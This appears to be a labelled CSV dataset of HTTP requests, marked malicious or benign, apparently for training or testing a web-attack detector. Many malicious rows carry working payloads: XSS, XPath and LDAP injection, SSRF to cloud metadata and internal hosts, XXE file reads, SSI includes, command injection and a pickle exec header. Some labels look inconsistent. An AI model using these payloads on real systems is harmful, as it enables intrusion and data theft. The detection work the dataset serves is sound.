label,text
malicious,"POST /api/redirect HTTP/1.1
Host: blog-connect.news-aggregator.io
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Length: 59
Connection: keep-alive

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"GET /media/images/banner.png HTTP/1.1
Host: marketing-assets-server.biz
X-Forwarded-For: 192.168.0.88
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://marketing-assets-server.biz/campaign/summer-sale
Connection: keep-alive"
malicious,"GET /api/file:///C:/Users/Public/Documents/config.ini HTTP/1.1
Host: analytics.fintech-solutions.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/xml, text/xml
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
malicious,"POST /api/v1/resources/query HTTP/1.1
Host: online-retail-store.biz
User-Agent: Wget/1.21.1 (linux-gnu)
Accept-Encoding: gzip
Accept: application/xml
Content-Type: application/xml
Content-Length: 153
Cache-Control: max-age=0

<searchRequest>
  <term>' or '1'='1' or name()='</term>
  <category>inventory</category>
</searchRequest>"
malicious,"POST /login HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Content-Length: 70
Referer: https://my-personal-blog-site.info/login

username=admin%00%00%0B<script>alert(document.domain)</script>&password=letmein"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: community.graphic-designers.space
Pragma: no-cache
Cache-Control: no-cache
Accept: image/png,image/*,*/*;q=0.8
User-Agent: curl/7.85.0"
benign,"POST /user/v3/request_password_reset HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
Content-Type: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Accept-Encoding: gzip, deflate
Content-Length: 51

{""email"":""luna_valleys@community.game-dev-forum.org""}"
benign,"POST /poll/vote/record HTTP/1.1
Host: digital-feedback-loop.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
Referer: https://digital-feedback-loop.com/poll/vote

poll_id=128&vote_option=optionC"
malicious,"GET /dashboard/home HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 <script>alert('LogViewerXSS')</script> (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close"
benign,"GET /explore/photos?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: urban-photo-archive.io
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://urban-photo-archive.io/explore
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Connection: keep-alive"
malicious,"GET /blog/article/view?id=3432 HTTP/1.1
Host: internal-staging-server.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"POST /account/privacy/settings HTTP/1.1
Host: secure-user-portal.org
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Accept: text/html
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Origin: https://secure-user-portal.org
Accept-Language: en-gb,en;q=0.8
X-CSRF-Token: a1b2c3d4e5f6g7h8i9j0

share_location=no&ad_preferences=personalized"
benign,"DELETE /api/v4/posts/7123 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: ApiKey 8849d33c35b144a083c6a98854b2d2a7
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: application/json
Referer: https://community.game-dev-forum.org/posts/7123
Connection: keep-alive"
benign,"GET /dashboard/data?token=7f830712a10b4e53a9d5e4b17c96bb983e71d5f270aab546d4a1af2b3c9e2256a59b3e8e769465587aeb855c0dcb17121158e3a2f5939bd9b8e16665df2c0a0f HTTP/1.1
Host: analytics-data-hub.io
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
X-Forwarded-For: 203.0.113.45"
malicious,"POST /customer/support/feedback HTTP/1.1
Host: helpdesk.quickfix-support.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://helpdesk.quickfix-support.io/customer/support/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=testuser&issue=login%20failure%0aid%0als%20-la%20%2Ftmp&priority=low"
benign,"PUT /api/blog/posts/542 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer gG12hiYXCVbnEWZmAWu196AQOSRfzpgD4yHdTlFS
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive

{""id"":542,""title"":""Exploring Rust for Web Development"",""slug"":""exploring-rust-for-web"",""content"":""This article walks through getting started with Rust in web apps, including tooling and examples."",""tags"":[""rust"",""webdev"",""programming""],""published"":true}"
benign,"DELETE /api/v5/articles/54321 HTTP/1.1
Host: blog-content-management.info
Authorization: ApiKey 572f8e0b4a8c4e78b309476c1df67a12
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: application/json
Connection: keep-alive"
malicious,"POST /user/query/filter HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Length: 94

{""searchFilter"": ""(title=moderator)(objectClass=person))(|(uid=administrator)""}"
malicious,"POST /enterprise/api/xmlquery HTTP/1.1
Host: financial-data-solutions.ai
User-Agent: Python-urllib/3.9
Accept-Encoding: gzip, deflate
Content-Type: application/xml
Content-Length: 152
Referer: https://portal.financial-data-solutions.ai/home

<searchRequest>
  <term>' or name()=' or 'a'='a</term>
  <category>reports</category>
</searchRequest>"
benign,"GET /robots.txt HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: BlogScanBot/0.7 (+http://my-personal-blog-site.info/bot)
Accept-Encoding: deflate
Accept-Language: en-US
Connection: keep-alive"
benign,"GET /getOrderDetails.xml?orderId=502 HTTP/1.1
Host: payment-gateway-solutions.com
Accept: application/xml
Authorization: Basic cGF5bWVudF91c2VyOjhcmUyc3RVc2VyMg==
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /resources/videos/intro_tutorial.mp4 HTTP/1.1
Host: media-streaming-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: video/webm,video/mp4;q=0.9,video/*;q=0.8
Range: bytes=0-1023
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
benign,"GET /search?query=2024+world+cup+statistics HTTP/1.1
Host: sports-arena-live.net
Accept: text/html
Referer: https://sports-arena-live.net/home
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Cache-Control: max-age=0"
benign,"POST /session/js HTTP/1.1
Host: interactive-learning-app.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/javascript
Content-Length: 34
Referer: https://interactive-learning-app.org/session
Content-Language: en-US

console.log('Session script executed');"
malicious,"GET /fetcher?url=http%3A%2F%2Fcdn.imagesync-media.org%2Favatar.jpg&format=jpeg&url=http%3A%2F%2F169.254.169.254%2Flatest%2Fuser-data HTTP/1.1
Host: edge-gateway.imagesync-media.org
User-Agent: Python-urllib/3.8
Accept-Language: en-US,en;q=0.7
Pragma: no-cache"
malicious,"POST /submit/url HTTP/1.1
Host: enterprise-data-hub.cloud
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Cache-Control: no-cache
Origin: https://enterprise-data-hub.cloud

fetch_data=gopher://internal-cache:6379/_%20%E0%B8%AD%E0%B8%B0%E0%B9%84%E0%B8%A3%E0%B8%81%E0%B9%87%E0%B8%94"
malicious,"POST /api/v1/comment/new HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Content-Length: 168
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Referer: https://community.game-dev-forum.org/threads/20987

{""thread_id"":20987,""author"":""PixelNinja"",""user_comment"":""Great tips on game design! Worth checking this link: javascript:alert('XSS')""}"
benign,"PUT /api/v1/devices/cc1321c/config HTTP/1.1
Host: iot-control-hub.cloud
Authorization: Bearer zxy0987asdkfl3579qw
Origin: https://iot-control-hub.cloud
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: application/json
User-Agent: curl/7.85.0
Content-Length: 106

{""configuration"": {""samplingInterval"": 3000, ""ledIndicator"": ""off"", ""autoUpdate"": true}, ""location"": ""warehouse-3""}"
benign,"GET /js/vendor/analytics.js HTTP/1.1
Host: urban-travel-diary.com
Connection: keep-alive
Accept: application/javascript, */*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://urban-travel-diary.com/blog/article/view/456
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
malicious,"GET /account/view/<ImG SrC=x OnErRoR=prompt(document.domain)> HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
benign,"OPTIONS /api/v1/users/8254/profile HTTP/1.1
Host: api.fin-servecloud.io
Origin: https://app.dashboard-finance.net
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /settings/permissions?filter[type]=admin&filter[active]=true HTTP/1.1
Host: secure-user-portal.net
Cache-Control: no-cache
Pragma: no-cache
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept-Language: en-GB,en;q=0.9
Referer: https://secure-user-portal.net/home"
benign,"HEAD /api/status HTTP/1.1
Host: platform-connector.cloud-hub.tools
User-Agent: Ruby
Accept: application/json
Connection: close"
benign,"HEAD /index.html HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close"
malicious,"POST /admin/panel/updateprefs HTTP/1.1
Host: enterprise-insight.ai
User-Agent: Python-urllib/3.9
Accept: application/json
Referer: https://enterprise-insight.ai/management/dashboard
Content-Type: application/json
Content-Length: 46
Cookie: session_cookie=XJsnf7ds8f7s8df7sdf7sd8f7

{""dashboardTheme"":""dark"",""enableBetaFeatures"":true}"
benign,"GET /blog/article/view/42?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/113.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Pragma: no-cache"
benign,"POST /account/login HTTP/1.1
Host: member-portal-services.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://member-portal-services.co/login
Connection: keep-alive

username=jane.doe&password=mypassword123&callback=%2Fdashboard%2Fhome"
benign,"POST /member/signup HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Origin: https://my-personal-blog-site.info
Referer: https://my-personal-blog-site.info/signup
Connection: keep-alive
Cookie: blog_auth=qd16Njzpf34jf8sj2hwasn9dn1

username=creative_writer&email=creative.writer%40my-personal-blog-site.info&password=Write!2024&password_confirm=Write!2024&terms_accepted=true"
benign,"GET /resource/load?file=downloads/setup/vpnclient_v5.9.2.dmg HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1
Accept: application/octet-stream
Accept-Language: en-US,en;q=0.6
DNT: 1
Connection: keep-alive"
benign,"OPTIONS /api/notifications/send HTTP/1.1
Host: messaging-service.securecloud.net
Origin: https://admin.notifications-dashboard.org
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization, x-request-id
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: keep-alive"
benign,"GET /blog/article/view/2567 HTTP/1.1
Host: my-personal-blog-site.info:3002
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://my-personal-blog-site.info/blog
Connection: keep-alive"
benign,"PUT /api/v5/dashboard/widgets/31415/config HTTP/1.1
Host: analytics-dashboard.app
Content-Type: application/json
Accept: application/json
Authorization: Token cffea6d2a19247f3b204180d9133dc19
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36
Connection: keep-alive
Content-Length: 342

{
  ""widgetId"": 31415,
  ""configuration"": {
    ""display"": {
      ""type"": ""time-series"",
      ""theme"": ""light"",
      ""refreshInterval"": 30000
    },
    ""dataSources"": [
      {""source"": ""metrics_api"", ""queries"": [""avg_cpu"", ""max_memory""]},
      {""source"": ""user_events"", ""filters"": {""eventType"": [""login"", ""purchase""]}}
    ],
    ""alerts"": [{""threshold"": 80, ""metric"": ""cpu"", ""condition"": ""above""}]
  }
}"
malicious,"POST /api/v1/profile/submit HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Origin: https://dashboard.cloud-data-services.ai
User-Agent: curl/7.76.1
Accept: */*
X-Requested-With: XMLHttpRequest

bio=Hi+there!+<!--#INCLUDE Virtual=""/usr/local/hidden/config.php"" --> Thanks!"
malicious,"GET /api/image/fetch?imageUrl=http%3A%2F%2Ffastcdn-resources.cloud%2Ficons%2Flogo.jpg&imageUrl=http%3A%2F%2F192.168.0.1%2Fadmin HTTP/1.1
Host: visual-stream-service.dev
User-Agent: Python-urllib/3.8
Accept-Language: en-US,en;q=0.9
Referer: https://visual-stream-service.dev/app"
benign,"GET /search/results?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: knowledge-hub-platform.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1"
malicious,"GET /content/view?id=7823 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://referrer.game-dev-forum.org/home
X-User-Role: admin
Cache-Control: no-cache"
benign,"POST /discussion/new-topic HTTP/1.1
Host: forums-apidev.exampletech.dev
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml
Content-Type: application/x-www-form-urlencoded
Content-Length: 175
Referer: https://forums-apidev.exampletech.dev/discussion/latest
Connection: keep-alive

forum_post=When+working+with+vanilla+JS+should+I+use+document.getElementById%28%22header%22%29+or+querySelector%28'%23header'%29+more+often%3F+Also%2C+what+about+using+%3Cp%3Etags+inside+the+HTML+markup%3F"
benign,"GET /learn/tutorials/basic-html HTTP/1.1
Host: code-academy-cloud.dev
Accept: text/html,application/xhtml+xml,application/xml
Connection: keep-alive
Cookie: last_read_b64=eyJ0dXRvcmllcyI6WyJpbWFnZXMiLCJtb3ZpZXMiXSwicGxheWJhY2siOlt7Im5hbWUiOiJCdXR0b24gUHJpbWUiLCJzdGF0dXMiOiJjb21wbGV0ZSJ9XX0=; visited=true
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-US,en;q=0.6"
malicious,"POST /login/auth HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.8
Content-Length: 104

user=frank'+and+substring(concat(substring(//members/user[1]/api_key,2,3),substring('DEF',2,1)),1,1)%3D'D&password=notsecret"
benign,"GET /api/v2/orders HTTP/1.1
Host: logistics-streamline.io
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.exampletoken
Connection: keep-alive"
malicious,"POST /redirect HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: */*
User-Agent: curl/7.77.0
X-Requested-With: XMLHttpRequest
Content-Length: 59

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
malicious,"POST /api/importConfiguration HTTP/1.1
Host: enterprise-upload-alpha.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36
Accept: application/json
Accept-Language: en-US
Content-Type: multipart/form-data; boundary=----FormBoundaryhd2wn5pQq5xnGcfg
Origin: https://enterprise-upload-alpha.net
Referer: https://enterprise-upload-alpha.net/uploader
Cookie: sessionid=3c925a028e538d732a1d9fa462770678
Connection: close

------FormBoundaryhd2wn5pQq5xnGcfg
Content-Disposition: form-data; name=""notes""

Import from config source
------FormBoundaryhd2wn5pQq5xnGcfg
Content-Disposition: form-data; name=""xmlfile""; filename=""config.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------FormBoundaryhd2wn5pQq5xnGcfg--"
malicious,"POST /user/login HTTP/1.1
Host: auth-portal.enterprise-systems.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Content-Length: 63
Connection: keep-alive

username=admin%00%08<script>alert(1)</script>&password=SuperSecret123"
benign,"GET /search?query=best+hiking+trails+colorado HTTP/1.1
Host: outdoor-adventure-tripplanner.com
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html
Referer: https://outdoor-adventure-tripplanner.com/
Via: 1.1 google
Connection: keep-alive"
benign,"POST /player/chat/send HTTP/1.1
Host: realm-multiplayer-online.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.8
Content-Length: 40
Connection: keep-alive
Referer: https://realm-multiplayer-online.net/game/session/12345

message=%2Fsay+Attack%21+Onwards%2C+team%21%21%21"
benign,"POST /api/authentication/login HTTP/1.1
Host: medtech-solutions.org
Content-Type: application/json
Accept: application/json
Origin: https://portal.medtech-solutions.org
X-CSRF-Token: 9b7c4238fa8dcbdaa3e91bfc62ef6a05
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Content-Length: 76

{""email"":""jonathan.pratt@medtech-solutions.org"",""password"":""N3wHope2023!""}"
malicious,"POST /submit/form HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Python-requests/2.25.1
Accept: application/xml,application/xhtml+xml,text/html;q=0.9
X-Pickle-Session: \x80\x03c__builtin__\nexec\nq\x00U\x1bprint('owned by attacker')\x85q\x01Rq\x02.
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

comment=hello+world&rating=5"
benign,"GET /user/data?id=svc-c3ad8a21 HTTP/1.1
Host: global-saas-provider.net
User-Agent: python-requests/2.31.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Connection: close
X-Forwarded-For: 203.0.113.42"
benign,"POST /v2/devices/update-state HTTP/1.1
Host: iot-cloud-connector.net
Authorization: Bearer eyJhbGc9IjMyM0NkIn0.AbcXyzBtSu7
Content-Type: application/json
Content-Length: 54
Idempotency-Key: d4e90ea2-c8ef-4f1a-adac-b2ac5527a022
X-Request-ID: 6713b016-478c-41b7-b407-e071a30d9ab1
X-Client-Version: 4.4.2
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.137 Safari/537.36

{""deviceId"":""dev-8891"",""state"":""active"",""batteryLevel"":87}"
benign,"POST /orders/submit HTTP/1.1
Host: eco-shop-online.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
User-Agent: Mozilla/5.0 (Windows NT 6.1; Wow64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
Referer: https://eco-shop-online.biz/cart
Cookie: cart_session=7d859ce62bd13ef28ef4

product_id=8832&quantity=1&promo_code=&shipping_method=express"
benign,"POST /upload/profile-photo HTTP/1.1
Host: profiles.secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 523
Accept: application/json
User-Agent: curl/7.88.1
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.securetoken1234567890_abcdefghijklmn
X-Requested-With: XMLHttpRequest
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/account/settings
Cookie: sid=7418529630abcdef1234567890abcdef

userId=824756&fileName=profile_pic_june_2024.jpg&fileSize=1048576&fileType=image%2Fjpeg&uploadTimestamp=1686883200&csrfToken=XT3ysKlpd37Xog5jfPaO0nHjiKpeEQHzS4&imageWidth=400&imageHeight=400&resize=true&crop=false&compression=medium&quality=85&format=jpeg&thumbnailGeneration=true&metadataInclude=true&privacy=private&notifyOnComplete=yes&maxRetries=3&retryDelay=500&overwriteExisting=true&tags=profile%2Cavatar%2Cuser&fileChecksum=9a3f7d71c2b0d25f6a5e4b1f4ae5d882&storageLocation=secure-archive&backupRequired=no&version=1"
benign,"DELETE /api/v1/photos/album-77/image-2054 HTTP/1.1
Host: secure-photo-storage.io
Authorization: Bearer 42efb7a9d5c8f1b724a65a87ee834c5f
If-Match: ""etag-img-2054-v2""
Accept: image/webp,image/apng,image/*,*/*;q=0.8
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Via: 1.1 exampleproxy.com
Connection: keep-alive"
benign,"POST /contact-us/form HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.82.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Referer: https://api.cloud-data-services.ai/contact-us
Cookie: session=787fb533ce239b58ac30aadc678c942f
Connection: keep-alive

name=Anna+Kowalski&email=anna.kowalski%40mailcity.co&subject=Technical+Inquiry&message=Good+day%2C+can+you+provide+more+details+about+the+API+rate+limits%3F"
